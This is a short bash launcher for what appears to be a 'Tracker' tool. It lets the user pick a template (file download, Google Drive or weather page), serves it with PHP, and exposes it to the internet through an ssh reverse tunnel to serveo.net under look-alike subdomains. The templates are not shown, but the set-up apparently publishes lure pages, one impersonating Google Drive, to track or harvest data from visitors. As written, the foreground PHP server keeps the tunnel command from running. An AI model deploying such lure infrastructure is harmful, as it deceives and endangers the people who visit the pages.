echo "Choose the Template:"
echo "1. File Download"
echo "2. Google Drive"
echo "3. Weather Page"

read -p "Enter Template Number: " tempno


filedownload(){

    echo "Starting PHP Server"
    cd /Tracker/filedownload
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
    
}

gdrive(){

    echo "Starting PHP Server"
    cd /Tracker/gdrive
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
    
}

weather(){

    echo "Starting PHP Server"
    cd /Tracker/weather
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
    
}


if [ $tempno == 1 ]
then
    filedownload
elif [ $tempno == 2 ]
then 
    gdrive
else
    weather
fi